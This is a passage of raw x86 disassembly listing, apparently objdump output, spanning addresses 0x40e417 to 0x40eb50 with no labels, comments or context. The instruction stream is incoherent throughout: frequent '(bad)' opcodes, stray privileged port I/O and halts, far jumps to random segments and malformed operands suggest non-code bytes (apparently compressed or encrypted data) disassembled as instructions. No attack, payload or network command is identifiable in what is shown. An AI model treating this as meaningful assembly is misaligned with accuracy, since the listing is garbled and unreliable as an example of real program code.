  40e417:	xor    al,0xa8
  40e419:	lods   eax,DWORD PTR ds:[esi]
  40e41a:	or     al,BYTE PTR [edx-0x52]
  40e41d:	lods   al,BYTE PTR ds:[esi]
  40e41e:	xor    dh,BYTE PTR [ecx-0x6b]
  40e421:	dec    esp
  40e422:	inc    eax
  40e423:	jb     0x40e47a
  40e425:	mov    eax,ds:0x4d39da9e
  40e42a:	sub    al,0x8d
  40e42c:	mov    esi,0x256e6042
  40e431:	inc    BYTE PTR [edi-0x46]
  40e434:	push   esi
  40e435:	inc    esi
  40e436:	pop    es
  40e437:	inc    edi
  40e438:	sbb    BYTE PTR [ecx+ebx*1],bh
  40e43b:	and    eax,0xe59e8f2c
  40e440:	inc    edi
  40e441:	mov    ebx,0x27d2b09a
  40e446:	aas    
  40e447:	add    al,BYTE PTR [esi+ebp*8-0x9]
  40e44b:	cmp    eax,0x84b26245
  40e450:	pop    esp
  40e451:	jno    0x40e443
  40e453:	and    DWORD PTR [ecx],edx
  40e455:	inc    ebx
  40e456:	out    dx,al
  40e457:	test   DWORD PTR [edx],edi
  40e459:	aas    
  40e45a:	xchg   edx,eax
  40e45b:	ret    
  40e45c:	addr16 xchg edx,eax
  40e45e:	add    ebx,DWORD PTR [esp+eiz*8]
  40e461:	lea    ebx,[ebx-0x3a]
  40e464:	push   ecx
  40e465:	lods   al,BYTE PTR ds:[esi]
  40e466:	pop    edi
  40e467:	mov    edx,0x6e411121
  40e46c:	pop    ebx
  40e46d:	jecxz  0x40e402
  40e46f:	inc    edi
  40e470:	adc    BYTE PTR [edi],0xd7
  40e473:	sahf   
  40e474:	(bad)  
  40e475:	loope  0x40e435
  40e477:	and    al,0x35
  40e479:	pop    eax
  40e47a:	sar    esi,1
  40e47c:	fwait
  40e47d:	add    al,ah
  40e47f:	(bad)  
  40e481:	fwait
  40e482:	sbb    eax,0xa416d90d
  40e487:	push   es
  40e488:	jbe    0x40e47a
  40e48a:	dec    ecx
  40e48b:	mov    ch,BYTE PTR [eax]
  40e48d:	fcom   QWORD PTR [edi+0x60]
  40e490:	into   
  40e491:	jne    0x40e492
  40e493:	cli    
  40e494:	mov    ah,0x6a
  40e496:	mov    ebp,0xcad0cf8
  40e49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e49c:	dec    edi
  40e49d:	ret    0x8e51
  40e4a0:	or     bl,BYTE PTR [esi]
  40e4a2:	pop    es
  40e4a3:	int3   
  40e4a4:	cmp    BYTE PTR [ecx+0x2f],bh
  40e4a7:	adc    esi,DWORD PTR [eax-0x3947205e]
  40e4ad:	ins    DWORD PTR es:[edi],dx
  40e4ae:	cmp    eax,ebx
  40e4b0:	xchg   esi,eax
  40e4b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4b3:	xchg   BYTE PTR [ecx],cl
  40e4b5:	jae    0x40e4d6
  40e4b7:	or     bl,bh
  40e4b9:	bswap  ecx
  40e4bb:	cmp    al,0xf9
  40e4bd:	retf   
  40e4be:	loope  0x40e46b
  40e4c0:	and    eax,0xc1a6ac3d
  40e4c5:	push   0xffffffdd
  40e4c7:	pop    esp
  40e4c8:	ret    0x126c
  40e4cb:	push   ds
  40e4cc:	fisub  WORD PTR [edx]
  40e4ce:	comiss xmm5,DWORD PTR [ebx+0x44]
  40e4d2:	shr    DWORD PTR [edx+0x5ed875e3],1
  40e4d8:	xchg   BYTE PTR [edx+0x4f6992a0],dh
  40e4de:	push   cs
  40e4df:	hlt    
  40e4e0:	sbb    al,0xe6
  40e4e2:	fisub  DWORD PTR gs:[esi-0x17]
  40e4e6:	mov    cl,0xdd
  40e4e8:	pusha  
  40e4e9:	adc    BYTE PTR [edx],0x11
  40e4ec:	jle    0x40e4c7
  40e4ee:	fisttp DWORD PTR [ebp+0x2b02208c]
  40e4f4:	outs   dx,BYTE PTR ds:[esi]
  40e4f5:	lods   al,BYTE PTR ds:[esi]
  40e4f6:	ins    DWORD PTR es:[edi],dx
  40e4f7:	adc    dl,ch
  40e4f9:	pop    edi
  40e4fa:	in     al,dx
  40e4fb:	mov    ds:0xecf54b80,eax
  40e500:	xor    esi,esp
  40e502:	pop    esp
  40e503:	add    BYTE PTR [ebp+0x7d356212],ch
  40e509:	pop    ss
  40e50a:	mov    esi,0xa2ce504f
  40e50f:	in     eax,dx
  40e510:	xor    edi,eax
  40e512:	xchg   edi,eax
  40e513:	fldenv [edx-0x4]
  40e516:	imul   ebx,DWORD PTR ds:0xc0e244d0,0xff47d0d1
  40e520:	dec    edi
  40e521:	arpl   sp,di
  40e523:	inc    ebx
  40e524:	ss out 0x2a,al
  40e527:	fiadd  WORD PTR [edi+0x37]
  40e52b:	jge    0x40e53b
  40e52d:	add    ah,BYTE PTR [ebp+0x74a563ec]
  40e533:	dec    ebp
  40e534:	fstp   TBYTE PTR [ebp+edi*2-0x5d]
  40e538:	jge    0x40e52b
  40e53a:	rcr    DWORD PTR [eax+0x67045079],cl
  40e540:	jl     0x40e59d
  40e542:	add    BYTE PTR [edx-0x9],ah
  40e545:	fstp   TBYTE PTR [ebx+0x3c]
  40e548:	idiv   BYTE PTR [eax*8+0x6d1d1c07]
  40e54f:	sub    al,bl
  40e551:	dec    eax
  40e552:	clc    
  40e553:	add    eax,0x8f23e269
  40e558:	lea    ecx,[ecx+0x30]
  40e55b:	inc    ebp
  40e55c:	or     cl,BYTE PTR [ecx+0x18457ea9]
  40e562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e563:	fisub  WORD PTR [eax]
  40e565:	ins    DWORD PTR es:[edi],dx
  40e566:	jecxz  0x40e500
  40e568:	xlat   BYTE PTR ds:[ebx]
  40e569:	push   0xfffffff0
  40e56b:	xchg   edi,eax
  40e56c:	test   al,0x3f
  40e56e:	ss aas 
  40e570:	jb     0x40e56e
  40e572:	jmp    0xf4d881ab
  40e577:	inc    BYTE PTR [eax+0x70]
  40e57a:	enter  0xffdf,0x12
  40e57e:	test   al,0xe1
  40e580:	ja     0x40e5af
  40e582:	push   ss
  40e583:	mov    esp,0x8a819b27
  40e588:	cld    
  40e589:	addr16 jnp 0x40e54e
  40e58c:	mov    esp,fs
  40e58e:	xor    eax,DWORD PTR [ecx]
  40e590:	pop    esi
  40e591:	jne    0x40e5b8
  40e593:	aaa    
  40e594:	bound  ecx,QWORD PTR [edi*2-0x14990ac]
  40e59b:	scas   eax,DWORD PTR es:[edi]
  40e59c:	shl    ebp,0xba
  40e59f:	sub    BYTE PTR [esi-0x80],al
  40e5a2:	jmp    0xd267:0xa73213c9
  40e5a9:	imul   edi,edi,0x74b8653e
  40e5af:	in     eax,dx
  40e5b0:	sbb    eax,0x2f08dc64
  40e5b5:	(bad)  
  40e5b6:	enter  0x900e,0x74
  40e5ba:	mov    ah,0xfd
  40e5bc:	out    0x49,eax
  40e5be:	pop    ebp
  40e5bf:	je     0x40e572
  40e5c1:	stos   DWORD PTR es:[edi],eax
  40e5c2:	dec    edi
  40e5c3:	outs   dx,BYTE PTR ds:[esi]
  40e5c4:	loop   0x40e5f6
  40e5c6:	and    dl,cl
  40e5c8:	or     eax,0x85d8372a
  40e5cd:	push   ecx
  40e5ce:	retf   0x4af5
  40e5d1:	lods   eax,DWORD PTR ds:[esi]
  40e5d2:	sbb    al,0xb6
  40e5d4:	push   ss
  40e5d5:	sti    
  40e5d6:	div    BYTE PTR [ecx]
  40e5d8:	xor    cl,ah
  40e5da:	clc    
  40e5db:	adc    BYTE PTR [eax+0x5c],cl
  40e5de:	fidiv  WORD PTR [ebx+0x65]
  40e5e1:	push   esi
  40e5e2:	jmp    0x607a74d6
  40e5e7:	dec    esi
  40e5e8:	jle    0x40e5ae
  40e5ea:	hlt    
  40e5eb:	adc    BYTE PTR [edx-0x40],bh
  40e5ee:	in     al,0xad
  40e5f0:	fcomp  st(2)
  40e5f2:	gs push ss
  40e5f4:	push   cs
  40e5f5:	cmp    eax,0xcdf0189a
  40e5fa:	outs   dx,BYTE PTR ds:[esi]
  40e5fb:	mov    ecx,eax
  40e5fd:	sahf   
  40e5fe:	push   edi
  40e5ff:	sbb    BYTE PTR [edi-0x359a572d],0xb4
  40e606:	inc    ebx
  40e607:	neg    BYTE PTR [edx+0x74151695]
  40e60d:	xchg   ebp,eax
  40e60e:	outs   dx,DWORD PTR ds:[esi]
  40e60f:	jnp    0x40e5e5
  40e611:	adc    DWORD PTR [ecx+ecx*8+0x69],esp
  40e615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e616:	sbb    esp,DWORD PTR [ebx]
  40e618:	mov    ds:0xfe5980b,al
  40e61d:	and    DWORD PTR [eax+0x70],esp
  40e620:	xchg   esp,eax
  40e621:	mov    ebp,0x84c3b37
  40e626:	imul   ebp,DWORD PTR [esi+0x39],0xffffffc1
  40e62a:	mov    al,0x3c
  40e62c:	mov    eax,ds:0x5fa4d37b
  40e631:	pop    ecx
  40e632:	mov    eax,ds:0x3e02a938
  40e637:	sub    BYTE PTR fs:[edi+0x64b97631],ch
  40e63e:	xor    al,0xac
  40e640:	xor    DWORD PTR [edx+0x19432782],edx
  40e646:	popf   
  40e647:	retf   0x21e9
  40e64a:	jmp    0x40e660
  40e64c:	retf   
  40e64d:	(bad)  
  40e64e:	sub    eax,0xe7ba1b83
  40e653:	cmp    dl,BYTE PTR [ebx+0x27]
  40e656:	cmp    eax,0x2ec6fd73
  40e65b:	cmp    BYTE PTR [esi+eiz*1+0x26],cl
  40e65f:	(bad)  
  40e661:	pop    ecx
  40e662:	adc    al,0x5b
  40e664:	in     al,0x52
  40e666:	ds call 0x9777740c
  40e66c:	pop    ebx
  40e66d:	pushf  
  40e66e:	fdiv   QWORD PTR [edx]
  40e670:	pop    esi
  40e671:	xchg   BYTE PTR [edi+0x48],ch
  40e674:	dec    esp
  40e675:	call   0xb680:0xa2145082
  40e67c:	outs   dx,DWORD PTR ds:[esi]
  40e67d:	fnstsw WORD PTR [esi-0x79abe3ac]
  40e683:	sub    al,0x4d
  40e685:	mov    ebx,0x5ff478ea
  40e68a:	ds adc eax,0xaeb75bd0
  40e690:	push   ebx
  40e691:	inc    ecx
  40e692:	retf   0x2cd2
  40e695:	or     eax,0x5a87c11b
  40e69a:	leave  
  40e69b:	mov    DWORD PTR [ebx+0x53],ebx
  40e69e:	jae    0x40e669
  40e6a0:	jbe    0x40e6f2
  40e6a2:	xlat   BYTE PTR ds:[ebx]
  40e6a3:	outs   dx,BYTE PTR ds:[si]
  40e6a5:	adc    DWORD PTR [edi-0x6b],esp
  40e6a8:	add    eax,0x9cd5205
  40e6ad:	call   0xd5783514
  40e6b2:	or     eax,0xc44d39f4
  40e6b7:	js     0x40e68e
  40e6b9:	pop    ebx
  40e6ba:	cmp    DWORD PTR [ebx],edi
  40e6bc:	jb     0x40e648
  40e6be:	dec    ecx
  40e6bf:	hlt    
  40e6c0:	push   esp
  40e6c1:	pop    edx
  40e6c2:	adc    ebx,DWORD PTR [ebx+ebx*4]
  40e6c5:	imul   DWORD PTR [eax+edx*2+0x6e32dafe]
  40e6cc:	or     dl,al
  40e6ce:	cmp    DWORD PTR [eax],edi
  40e6d0:	stos   DWORD PTR es:[edi],eax
  40e6d1:	mov    ebx,0x62e66e14
  40e6d6:	arpl   WORD PTR [edi+0x3b],bp
  40e6d9:	mov    ?,WORD PTR [esi-0xa]
  40e6dc:	dec    esi
  40e6dd:	imul   edx,DWORD PTR [ebx],0x4b
  40e6e0:	push   edx
  40e6e1:	add    DWORD PTR [eax+esi*1],0x9ec201b8
  40e6e8:	das    
  40e6e9:	imul   DWORD PTR [esi+0x59]
  40e6ec:	gs jae 0x40e72d
  40e6ef:	push   ebp
  40e6f0:	(bad)  
  40e6f1:	call   0x5053:0xde050e1e
  40e6f8:	push   cs
  40e6f9:	add    BYTE PTR [edi+0x10],al
  40e6fc:	leave  
  40e6fd:	rcr    BYTE PTR [edi-0x7fabe2cb],0x96
  40e704:	test   BYTE PTR [esp+eiz*4-0x3c740a34],ah
  40e70b:	sbb    al,0x56
  40e70d:	xor    al,0xcc
  40e70f:	mov    edx,ds
  40e711:	sub    al,0xc9
  40e713:	xchg   ecx,eax
  40e714:	lds    edx,FWORD PTR [eax-0x5e600c9d]
  40e71a:	sbb    bh,bh
  40e71c:	stc    
  40e71d:	xchg   ebx,eax
  40e71e:	mov    ecx,0x60e55dfd
  40e723:	sub    BYTE PTR [esi],bh
  40e725:	dec    esi
  40e726:	cmp    al,0xaf
  40e728:	cli    
  40e729:	jno    0x40e6c7
  40e72b:	mov    esp,0xa8ff31e7
  40e730:	or     BYTE PTR [ebx],ah
  40e732:	inc    ecx
  40e733:	test   eax,0x25f233de
  40e738:	mov    edx,0xd99db7e7
  40e73d:	mov    edx,0x3462e384
  40e742:	mov    dl,0x50
  40e744:	je     0x40e74e
  40e746:	jg     0x40e7a8
  40e748:	lock ja 0x40e75b
  40e74b:	fwait
  40e74c:	and    eax,0xed9863ae
  40e751:	retf   0x3e26
  40e754:	jnp    0x40e718
  40e756:	rol    DWORD PTR [edx],1
  40e758:	jb     0x40e74d
  40e75a:	aas    
  40e75b:	push   0xffffffca
  40e75d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e75e:	cmp    al,0x85
  40e760:	jmp    0x3609:0x268b0a90
  40e767:	jg     0x40e7af
  40e769:	ss pop ebx
  40e76b:	xor    cl,ch
  40e76d:	lock cmp al,0x2a
  40e770:	cli    
  40e771:	jne    0x40e742
  40e773:	sub    eax,0x11037674
  40e778:	mov    DWORD PTR [esi],ecx
  40e77a:	pusha  
  40e77b:	(bad)  
  40e77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e77d:	mov    ch,0xd7
  40e77f:	sub    al,0xae
  40e781:	dec    esi
  40e782:	mov    ebx,0xeadf918d
  40e787:	dec    esp
  40e788:	arpl   WORD PTR [eax+ebx*2],bp
  40e78b:	fdiv   st,st(2)
  40e78d:	adc    ah,0x7d
  40e790:	sub    eax,0x5cd6db4a
  40e795:	lahf   
  40e796:	or     ah,dl
  40e798:	push   0x54
  40e79a:	add    al,0xcf
  40e79c:	stos   DWORD PTR es:[edi],eax
  40e79d:	push   esp
  40e79e:	outs   dx,BYTE PTR ds:[esi]
  40e79f:	in     eax,0x4
  40e7a1:	gs loop 0x40e7ea
  40e7a4:	not    BYTE PTR [ebp+0x3d]
  40e7a7:	imul   edi,DWORD PTR [esi+0x3c301546],0xcdb443bd
  40e7b1:	and    eax,0xfc4f2f78
  40e7b6:	xchg   DWORD PTR [esp+ebp*1+0x68],esi
  40e7ba:	sbb    dh,BYTE PTR [ebx-0x3e]
  40e7bd:	jnp    0x40e815
  40e7bf:	and    cl,BYTE PTR [ebx]
  40e7c1:	mov    cl,0xff
  40e7c3:	mov    dh,0xe6
  40e7c5:	add    esp,ecx
  40e7c7:	mul    BYTE PTR [ebp+0x18]
  40e7ca:	xor    al,0xf0
  40e7cc:	push   ds
  40e7cd:	jl     0x40e783
  40e7cf:	ins    BYTE PTR es:[edi],dx
  40e7d0:	iret   
  40e7d1:	ror    DWORD PTR ds:0x648fb4cd,0xa1
  40e7d8:	cld    
  40e7d9:	aam    0x7c
  40e7db:	push   eax
  40e7dc:	xchg   esp,eax
  40e7dd:	test   cl,al
  40e7df:	mov    ebx,DWORD PTR [edi+0x73]
  40e7e2:	jmp    0x8583:0xafd5b5a9
  40e7e9:	addr16 mov eax,0x69d16a6b
  40e7ef:	out    0xca,al
  40e7f1:	fisub  DWORD PTR [ebx+0x36]
  40e7f4:	jb     0x40e781
  40e7f6:	(bad)  
  40e7f7:	add    esi,DWORD PTR [edx]
  40e7f9:	add    DWORD PTR [esi],0x193bd517
  40e7ff:	enter  0xb0e3,0xec
  40e803:	dec    BYTE PTR [ebx-0x1d]
  40e806:	sub    ch,BYTE PTR [ebp+0x6fa255a8]
  40e80c:	js     0x40e78e
  40e80e:	cmp    al,0x72
  40e810:	jnp    0x40e86b
  40e812:	mov    esi,0x3229e730
  40e817:	sahf   
  40e818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e819:	lahf   
  40e81a:	cld    
  40e81b:	cmp    BYTE PTR [ecx+0x2c33dbf],0x6a
  40e822:	int    0x8a
  40e824:	popf   
  40e825:	in     eax,0xa0
  40e827:	call   0xbcb4:0xf542dc23
  40e82e:	loope  0x40e7fb
  40e830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e831:	les    edx,FWORD PTR [eax-0x25]
  40e834:	popf   
  40e835:	loopne 0x40e7c1
  40e837:	pop    ss
  40e838:	xchg   ecx,eax
  40e839:	leave  
  40e83a:	shl    esi,cl
  40e83c:	xchg   edi,eax
  40e83d:	inc    ebx
  40e83e:	inc    eax
  40e83f:	jne    0x40e7cd
  40e841:	dec    ebp
  40e842:	in     eax,0x47
  40e844:	sub    DWORD PTR [eax+0x57],0x2dc1c8de
  40e84b:	cmp    BYTE PTR [ebx],al
  40e84d:	cmp    al,0xa6
  40e84f:	(bad)  [ecx+esi*8-0x6f058aaa]
  40e856:	inc    esi
  40e857:	pop    ss
  40e858:	mov    esp,0x2e887025
  40e85d:	and    eax,0xe89ae23c
  40e862:	dec    edx
  40e863:	rcr    BYTE PTR [eax+0x32],cl
  40e866:	add    ebp,DWORD PTR [ebx]
  40e868:	mov    dl,0x87
  40e86a:	adc    al,0xc3
  40e86c:	test   BYTE PTR [ebx-0x61],ch
  40e86f:	sub    ch,BYTE PTR [edx+0x45dfcf86]
  40e875:	(bad)  
  40e876:	fstp   QWORD PTR [ebx+0x4b]
  40e879:	inc    ebp
  40e87a:	add    al,0x38
  40e87c:	or     ecx,0x46
  40e87f:	mov    dl,0x97
  40e881:	sti    
  40e882:	or     DWORD PTR [ecx-0x13],edi
  40e885:	mov    ch,0x9f
  40e887:	(bad)  [edx-0x6a]
  40e88a:	mov    ch,0x23
  40e88c:	mov    edi,DWORD PTR [ebp+0x25]
  40e88f:	popa   
  40e890:	bound  eax,QWORD PTR [ebx+0x7ef0cc57]
  40e896:	loope  0x40e886
  40e898:	sub    eax,0xbefa27fa
  40e89d:	fisttp DWORD PTR [esi-0xb]
  40e8a0:	push   ds
  40e8a1:	outs   dx,DWORD PTR ds:[esi]
  40e8a2:	inc    eax
  40e8a3:	pop    ss
  40e8a4:	inc    edx
  40e8a5:	pop    ebx
  40e8a6:	cmp    al,0x22
  40e8a8:	ss retf 
  40e8aa:	nop
  40e8ab:	into   
  40e8ac:	ror    BYTE PTR [ebp-0x51f69ab2],0x39
  40e8b3:	push   edx
  40e8b4:	imul   eax,DWORD PTR [ebp+edi*1+0x2d574db1],0x59
  40e8bc:	rcl    ah,1
  40e8be:	push   es
  40e8bf:	je     0x40e88a
  40e8c1:	mov    edi,0xaa4cf611
  40e8c6:	in     eax,dx
  40e8c7:	js     0x40e8ff
  40e8c9:	aas    
  40e8ca:	mov    cl,0xc4
  40e8cc:	outs   dx,BYTE PTR ds:[esi]
  40e8cd:	adc    al,0x9f
  40e8cf:	fwait
  40e8d0:	jnp    0x40e862
  40e8d2:	(bad)  
  40e8d3:	out    0x5,al
  40e8d5:	adc    ebx,ecx
  40e8d7:	sbb    edx,edi
  40e8d9:	push   esi
  40e8da:	nop
  40e8db:	and    bh,0xbd
  40e8de:	arpl   WORD PTR [ecx-0x60],bp
  40e8e1:	mov    bh,0x23
  40e8e3:	popa   
  40e8e4:	or     cl,BYTE PTR [edx+0x5d]
  40e8e7:	scas   al,BYTE PTR es:[edi]
  40e8e8:	enter  0xea4c,0x41
  40e8ec:	rcr    BYTE PTR [edx+esi*1+0x8],1
  40e8f0:	popa   
  40e8f1:	push   ecx
  40e8f2:	and    dl,bl
  40e8f4:	icebp  
  40e8f5:	mov    esp,0x2a42c6aa
  40e8fa:	push   cs
  40e8fb:	jmp    0x40e87f
  40e8fd:	pop    ebx
  40e8fe:	inc    esi
  40e8ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e900:	popa   
  40e901:	lds    esi,FWORD PTR [edx]
  40e903:	mov    dl,0x91
  40e905:	cwde   
  40e906:	xchg   esi,eax
  40e907:	xchg   esp,eax
  40e908:	repz fmulp st(4),st
  40e90b:	sahf   
  40e90c:	mov    bl,0x23
  40e90e:	jnp    0x40e8df
  40e910:	cdq    
  40e911:	push   ecx
  40e912:	popa   
  40e913:	leave  
  40e914:	rcr    BYTE PTR ds:0xaebacc9c,1
  40e91a:	dec    esp
  40e91b:	pushf  
  40e91c:	loop   0x40e97c
  40e91e:	add    dl,BYTE PTR [edx]
  40e920:	mov    ch,dh
  40e922:	pusha  
  40e923:	add    eax,0xeeb001ff
  40e928:	mov    eax,0xd18fd0c4
  40e92d:	mov    ecx,0xe2723c3
  40e932:	lea    esi,[edi-0x2]
  40e935:	or     edx,DWORD PTR [edx-0x36]
  40e938:	cli    
  40e939:	cmp    ah,ah
  40e93b:	cmp    DWORD PTR [edx-0x4b45eb30],edx
  40e941:	mov    WORD PTR [eax],?
  40e943:	inc    dh
  40e945:	(bad)  
  40e946:	mov    eax,0xc4cad37
  40e94b:	pop    ss
  40e94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e94d:	push   ecx
  40e94e:	dec    eax
  40e94f:	mov    bh,0xb5
  40e951:	call   0x9bd4d6cd
  40e956:	nop
  40e957:	lods   eax,DWORD PTR ds:[esi]
  40e958:	jl     0x40e93c
  40e95a:	mov    dl,0x95
  40e95c:	(bad)  
  40e95d:	bswap  edx
  40e95f:	aaa    
  40e960:	out    dx,al
  40e961:	lds    ecx,FWORD PTR [edx]
  40e963:	fs dec ebx
  40e965:	aas    
  40e966:	mov    gs,WORD PTR [edx+0x3d]
  40e969:	mov    ecx,esi
  40e96b:	push   edi
  40e96c:	jne    0x40e900
  40e96e:	hlt    
  40e96f:	jno    0x40e929
  40e971:	pushf  
  40e972:	jl     0x40e9d1
  40e974:	inc    esi
  40e975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e976:	cs hlt 
  40e978:	jle    0x40e9c2
  40e97a:	dec    ebx
  40e97b:	xchg   ebx,eax
  40e97c:	inc    ebx
  40e97d:	fdivr  DWORD PTR [ecx+0x2e]
  40e980:	xchg   ecx,eax
  40e981:	call   0xf4b:0xf5acfe6
  40e988:	push   es
  40e989:	xor    bl,BYTE PTR [ecx+0x26]
  40e98c:	xchg   DWORD PTR [ebp+0x6ec4de7],edi
  40e992:	jnp    0x40e95f
  40e994:	mov    al,0xa7
  40e996:	push   ebp
  40e997:	gs (bad) 
  40e99a:	xchg   edx,eax
  40e99b:	sti    
  40e99c:	push   ecx
  40e99d:	aam    0x4c
  40e99f:	pop    eax
  40e9a0:	stc    
  40e9a1:	(bad)  [edx+0x28]
  40e9a4:	sbb    DWORD PTR [ecx+0x5b88e63],ecx
  40e9aa:	xchg   ebx,eax
  40e9ab:	sub    BYTE PTR [eax-0x5],ch
  40e9ae:	fild   DWORD PTR [esi]
  40e9b0:	popf   
  40e9b1:	push   ebp
  40e9b2:	and    ecx,DWORD PTR [esi]
  40e9b4:	mov    DWORD PTR ss:[esi],ecx
  40e9b7:	mov    esp,0x71b61794
  40e9bc:	push   esp
  40e9bd:	inc    eax
  40e9be:	aam    0xce
  40e9c0:	inc    ebp
  40e9c1:	add    dh,BYTE PTR [ebx]
  40e9c3:	(bad)  
  40e9c5:	in     eax,dx
  40e9c6:	clc    
  40e9c7:	in     al,dx
  40e9c8:	ins    DWORD PTR es:[edi],dx
  40e9c9:	je     0x40e989
  40e9cb:	lods   al,BYTE PTR ds:[esi]
  40e9cc:	bound  esi,QWORD PTR [eax-0x26b84a3d]
  40e9d2:	mov    al,ds:0x8e69344e
  40e9d7:	jne    0x40ea4e
  40e9d9:	lds    eax,FWORD PTR [ecx+ebp*4+0xfd48684]
  40e9e0:	sti    
  40e9e1:	dec    ecx
  40e9e2:	sti    
  40e9e3:	jmp    0x4d59:0x390fa82
  40e9ea:	xor    BYTE PTR [ebp-0x25],al
  40e9ed:	and    al,0xd3
  40e9ef:	xchg   ebx,eax
  40e9f0:	or     cl,BYTE PTR [edx]
  40e9f2:	cmp    DWORD PTR [ebx-0x59],ecx
  40e9f5:	loop   0x40e9f5
  40e9f7:	stc    
  40e9f8:	and    eax,0xf1b56933
  40e9fd:	das    
  40e9fe:	ret    
  40e9ff:	cmp    BYTE PTR [ecx],bl
  40ea01:	pushf  
  40ea02:	sbb    eax,0x7c7951b1
  40ea07:	and    edi,eax
  40ea09:	xor    bl,BYTE PTR [esi]
  40ea0b:	jmp    0x27ff7676
  40ea10:	in     al,dx
  40ea11:	pushf  
  40ea12:	cdq    
  40ea13:	jl     0x40e9c2
  40ea15:	adc    BYTE PTR [edx],ch
  40ea17:	pop    ebp
  40ea18:	pop    ebx
  40ea19:	popa   
  40ea1a:	pop    eax
  40ea1b:	jmp    0x3d3eeeca
  40ea20:	mov    edi,0xcd915a2
  40ea25:	dec    ecx
  40ea26:	xchg   edi,eax
  40ea27:	pop    esi
  40ea28:	fstp   TBYTE PTR [ebx]
  40ea2a:	jo     0x40ea53
  40ea2c:	in     al,0x60
  40ea2e:	dec    esi
  40ea2f:	jmp    0x166d:0x785359e9
  40ea36:	imul   ebp,DWORD PTR [eax+0x139799af],0xcdd0e639
  40ea40:	push   edi
  40ea41:	les    esi,FWORD PTR [esi+esi*4+0x1ccf99a5]
  40ea48:	call   0x87599dd9
  40ea4d:	add    al,0x35
  40ea4f:	add    BYTE PTR [esi-0x6b],al
  40ea52:	fmul   DWORD PTR [ebx]
  40ea54:	popf   
  40ea55:	add    eax,0x2239a229
  40ea5a:	in     eax,0x78
  40ea5c:	outs   dx,BYTE PTR ds:[esi]
  40ea5d:	dec    esp
  40ea5e:	mov    dl,0xe2
  40ea60:	mov    ah,0xff
  40ea62:	mov    bl,0x49
  40ea64:	aad    0xec
  40ea66:	pop    ds
  40ea67:	mov    ch,0x42
  40ea69:	retf   0x7ac7
  40ea6c:	xchg   esi,eax
  40ea6d:	jg     0x40ea03
  40ea6f:	je     0x40ea2d
  40ea71:	jl     0x40eab6
  40ea73:	or     bl,dh
  40ea75:	mov    ch,0x7a
  40ea77:	push   eax
  40ea78:	pop    edi
  40ea79:	cmp    DWORD PTR [edx+0x72],edi
  40ea7c:	add    ecx,DWORD PTR ds:0x242a9009
  40ea82:	push   edi
  40ea83:	adc    BYTE PTR [esi+0x6b273d9b],al
  40ea89:	adc    eax,0xb72c1685
  40ea8e:	scas   eax,DWORD PTR es:[edi]
  40ea8f:	dec    esi
  40ea90:	jle    0x40ea7c
  40ea92:	pusha  
  40ea93:	cli    
  40ea94:	push   edi
  40ea95:	pop    edx
  40ea96:	or     BYTE PTR ds:0xd40106f9,ah
  40ea9c:	test   al,0x55
  40ea9e:	nop
  40ea9f:	inc    edi
  40eaa0:	cmp    esi,DWORD PTR [eax]
  40eaa2:	jae    0x40eb0d
  40eaa4:	jbe    0x40eadd
  40eaa6:	add    BYTE PTR [ecx-0x7c],bl
  40eaa9:	sub    bh,BYTE PTR [eax]
  40eaab:	sti    
  40eaac:	mov    dl,0xef
  40eaae:	pop    eax
  40eaaf:	push   ebp
  40eab0:	mov    ss,WORD PTR [ecx-0x2812f978]
  40eab6:	test   BYTE PTR [eax+eax*1-0x1d],dl
  40eaba:	out    0x12,eax
  40eabc:	aas    
  40eabd:	cmc    
  40eabe:	jmp    0xfc121ae1
  40eac3:	dec    edi
  40eac4:	out    dx,eax
  40eac5:	inc    esp
  40eac6:	add    al,0xd7
  40eac8:	xor    ebx,DWORD PTR [edx+edx*8+0x5b421108]
  40eacf:	xchg   bl,ch
  40ead1:	pop    edi
  40ead2:	push   ebx
  40ead3:	xchg   BYTE PTR ds:0x3b5ef50b,dh
  40ead9:	lea    esp,[edi+0x67a7ace6]
  40eadf:	mov    esi,ebx
  40eae1:	dec    esp
  40eae2:	fwait
  40eae3:	jno    0x40eb2d
  40eae5:	rcl    BYTE PTR ds:0x82bb01ce,cl
  40eaeb:	lods   eax,DWORD PTR ds:[esi]
  40eaec:	sub    dh,ah
  40eaee:	shl    edi,cl
  40eaf0:	mov    dh,bh
  40eaf2:	adc    edi,DWORD PTR [edi]
  40eaf4:	fldcw  WORD PTR [eax]
  40eaf6:	jmp    0xfbe9fbf2
  40eafb:	cmp    eax,0x81fd377b
  40eb00:	jno    0x40eaf6
  40eb02:	jl     0x40eb69
  40eb04:	call   FWORD PTR [ecx+0x249a8f15]
  40eb0a:	mov    eax,ds:0x5e716d08
  40eb0f:	push   edi
  40eb10:	mov    al,0xa8
  40eb12:	jecxz  0x40eb27
  40eb14:	mov    al,ds:0x9dc8d1fc
  40eb19:	or     esp,DWORD PTR [edi]
  40eb1b:	pop    eax
  40eb1c:	or     esi,edx
  40eb1e:	out    0xb4,eax
  40eb20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb21:	in     al,0x67
  40eb23:	mov    dl,0x30
  40eb25:	mov    al,ds:0x1159b7aa
  40eb2a:	test   eax,0x2f8e5676
  40eb2f:	or     dl,BYTE PTR [edx+0x32]
  40eb32:	rcl    esi,0x93
  40eb35:	xchg   ecx,eax
  40eb36:	jle    0x40eb70
  40eb38:	out    0xe,al
  40eb3a:	icebp  
  40eb3b:	jo     0x40eb8e
  40eb3d:	add    edx,ebx
  40eb3f:	mov    ebp,0x9bd715b1
  40eb44:	mov    bl,0xd0
  40eb46:	push   esi
  40eb47:	das    
  40eb48:	aas    
  40eb49:	push   esp
  40eb4a:	mov    eax,0x1660e7d8
  40eb4f:	inc    esp
  40eb50:	fcomp  QWORD PTR [ecx-0x39]
